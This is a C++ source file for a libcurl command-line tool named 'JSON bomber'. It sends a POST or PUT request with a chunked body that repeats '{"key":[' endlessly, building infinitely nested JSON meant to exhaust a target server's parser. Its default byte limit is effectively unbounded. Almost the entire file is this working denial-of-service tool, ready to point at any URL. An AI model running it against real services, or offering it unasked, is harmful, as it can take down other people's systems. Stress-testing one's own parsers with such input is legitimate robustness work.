#include <iostream>
#include <memory>
#include <map>
#include <fstream>

#include <curl/curl.h>
#include <tclap/CmdLine.h>

namespace contour {
    typedef std::basic_streambuf<char, std::char_traits<char>> StdStreamBuf;

    enum class HttpStatus {
        OK = 200,
        CREATED = 201,
        ACCEPTED = 202,
        INVALID_REQUEST = 400,
        UNAUTHORIZED = 401,
        NOT_FOUND = 404,
        CANCELLED = 408,
        INVALID_REPLY = 490,
        SERVICE_ERROR = 499,
        INTERNAL_SERVER_ERROR = 500,
        IO_ERROR = 590,
        INTERNAL_ERROR = 591,
        UNKNOWN_ERROR = 666,
        TIMEOUT = 999
    };


    struct error : std::runtime_error {
        HttpStatus errcode;
        error(HttpStatus errcode, const std::string & what)
            : std::runtime_error(what), errcode(errcode) {}
    };

    struct ssl_error : error {
        ssl_error(const std::string & msg)
            : error(HttpStatus::INTERNAL_SERVER_ERROR, msg) {}
    };
};

struct curl_slist_guard {
    curl_slist * slist;
    curl_slist_guard(curl_slist * slist = nullptr): slist(slist) {}
    curl_slist_guard(const curl_slist_guard &) = delete;
    ~curl_slist_guard() {
        if(slist) {
            curl_slist_free_all(slist);
        }
    }
};

struct JsonBombGenerator {

    size_t read(char * buffer, size_t offset, size_t size) {
        size_t read = 0;

        while(read < size && (limit == 0 || counter < limit)) {
            buffer[offset + read] = monomer[counter++ % monomer.size()];
            ++read;
        }

        return read;
    }

    const size_t limit;

    JsonBombGenerator(size_t limit) :limit(limit) {}

private:
    unsigned int counter = 0;
    const static std::string monomer;
};

const std::string JsonBombGenerator::monomer("{\"key\":[");

static size_t read_callback(char * buffer, size_t size, size_t nitems, void * ptr) {
    JsonBombGenerator * generator = (JsonBombGenerator *) ptr;
    return generator->read(buffer, 0, size * nitems);
}

static size_t write_callback(char * buffer, size_t size, size_t nmemb, void * ptr) {
    auto sbuf = (contour::StdStreamBuf *) ptr;
    return sbuf->sputn(buffer, size * nmemb);
}

static void check_curl_code(CURLcode code, const char * error_buffer = nullptr) {
    if(code != CURLE_OK) {
        std::string msg = curl_easy_strerror(code);

        if(error_buffer && *error_buffer) {
            msg += "\n";
            msg += error_buffer;
        }

        contour::HttpStatus errcode;

        switch(code) {
            case CURLE_COULDNT_CONNECT:
            case CURLE_COULDNT_RESOLVE_HOST:
                errcode = contour::HttpStatus::IO_ERROR;
                break;

            case CURLE_OPERATION_TIMEDOUT:
                errcode = contour::HttpStatus::TIMEOUT;
                break;

            case CURLE_SSL_CONNECT_ERROR:
                throw contour::ssl_error(msg);

            default:
                errcode = contour::HttpStatus::UNKNOWN_ERROR;
                break;
        }

        throw contour::error(errcode, msg);
    }
}


int main(int argc, char * argv[]) {
    TCLAP::CmdLine cmd("JSON bomber", ' ', "1.0");
    TCLAP::UnlabeledValueArg<std::string> urlArg("url", "http url of the service to call", true, "http://localhost:80", "url", cmd);
    TCLAP::SwitchArg verboseSwitch("v", "verbose", "Verbose curl switch", cmd, false);
    TCLAP::SwitchArg followSwitch("L", "location", "Follows HTTP redirect", cmd, false);
    TCLAP::SwitchArg compressionSwitch("Z", "compression", "Enable response compression", cmd, false);
    TCLAP::ValueArg<std::string> methodArg("X", "request", "HTTP method", false, "GET", "USER", cmd);
    TCLAP::ValueArg<std::string> outputArg("o", "output", "Output file", false, "", "OUTPUT_FILE", cmd);
    TCLAP::ValueArg<size_t> limitArg("l", "limit", "Max number of bytes to send", false, -1, "MAX_BYTES", cmd);
    TCLAP::ValueArg<size_t> timeoutArg("t", "timeout", "Request timeout in milliseconds", false, 0, "TIMEOUT", cmd);
    cmd.parse(argc, argv);
    std::unique_ptr<CURL, decltype(&curl_easy_cleanup)> reference_holder(curl_easy_init(), &curl_easy_cleanup);
    CURL * curl = reference_holder.get();
    curl_slist_guard header_list;
    std::vector<char> error_buffer(CURL_ERROR_SIZE, '\0');
    std::unique_ptr<contour::StdStreamBuf> outputFileBuffer;
    const std::string & outputFile = outputArg;
    contour::StdStreamBuf * outputBuffer;

    if(outputFile.empty()) {
        outputBuffer = std::cout.rdbuf();
    } else {
        std::filebuf * fb = new std::filebuf();
        fb->open(outputFile, std::ios::out | std::ios::binary);
        outputFileBuffer = std::unique_ptr<contour::StdStreamBuf>(fb);
        outputBuffer = outputFileBuffer.get();
    }

    const std::string & url = (std::string) urlArg;
    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
    curl_easy_setopt(curl, CURLOPT_VERBOSE, verboseSwitch ? 1L : 0L);
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, followSwitch ? 1L : 0L);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, outputBuffer);

    if((bool) compressionSwitch) {
        curl_easy_setopt(curl, CURLOPT_ACCEPT_ENCODING, "");
    }

    size_t tout = (size_t) timeoutArg;

    if(tout > 0) {
        curl_easy_setopt(curl, CURLOPT_TIMEOUT_MS, tout);
    }

    curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 10L);
    std::unique_ptr<JsonBombGenerator> generator;
    const std::string & httpMethod = (std::string) methodArg;

    if(httpMethod == "POST" || httpMethod == "PUT") {
        header_list.slist = curl_slist_append(header_list.slist, "Content-Type: application/json");
        header_list.slist = curl_slist_append(header_list.slist, "Transfer-Encoding: chunked");
        curl_easy_setopt(curl, CURLOPT_PUT, 1L);
        if(httpMethod == "POST") {
            curl_easy_setopt(curl, CURLOPT_HTTPPOST, 1L);
        } else if(httpMethod == "PUT") {
            curl_easy_setopt(curl, CURLOPT_PUT, 1L);
        }
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, NULL);
        curl_easy_setopt(curl, CURLOPT_READFUNCTION, read_callback);
        generator = std::make_unique<JsonBombGenerator>((size_t) limitArg);
        curl_easy_setopt(curl, CURLOPT_READDATA, generator.get());
    }

    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, header_list.slist);
    CURLcode res = curl_easy_perform(curl);
    check_curl_code(res, error_buffer.data());
    long code;
    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &code);
    contour::HttpStatus http_status = (contour::HttpStatus) code;
    return 0;
}
